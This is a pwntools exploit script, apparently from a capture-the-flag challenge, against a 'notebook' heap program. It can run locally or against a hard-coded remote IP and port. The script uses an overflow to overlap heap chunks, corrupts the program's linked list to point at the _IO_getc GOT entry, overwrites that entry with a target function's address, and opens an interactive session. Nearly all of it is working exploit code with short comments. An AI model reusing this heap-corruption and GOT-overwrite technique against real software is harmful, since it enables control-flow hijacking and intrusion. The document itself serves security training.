from pwn import *
from time import sleep
import os
r =ELF("./notebook")
target = r.got['_IO_getc']
if 'remote' in os.environ:
    io = remote('125.235.240.172',1337)
else:
    io = process(r.path)
def back():
    io.sendafter('Delete\n','1')
def next():
    io.sendafter('Delete\n','2')
def add(content):
    io.sendafter('Delete\n','3')
    sleep(0.25)
    io.sendline(content)
 
def addbig(content):
    io.sendafter('Delete\n','4')
    sleep(0.25)
    io.sendline(content)
def edit(content):
    io.sendafter('Delete\n','5')
    sleep(0.25)
    io.sendline(content)
def delete():
    io.sendafter('Delete\n','6')
#Add 5 notes
add('A')
add('B')
add('C')
add('D')
add('E')
#The bug is that 16 bytes first of each chunk is used as a part of the notebook double linked list. Plan is Overwrite that value into target so we can Edit it
back()#4
delete()

back()#2
back()#1
edit("A"*(984)+p64(1000+1000+1+8*2)) #there is a formula. Check overlapping chunks 2 on how2heap
next()
delete()
next()#3
next()#5
addbig("F"*984+p64(0x3f1)+p64(target-16)*2)
back()#5
back()#3
back()
#next()
edit(p64(r.symbols['canyourunme']))
io.interactive()
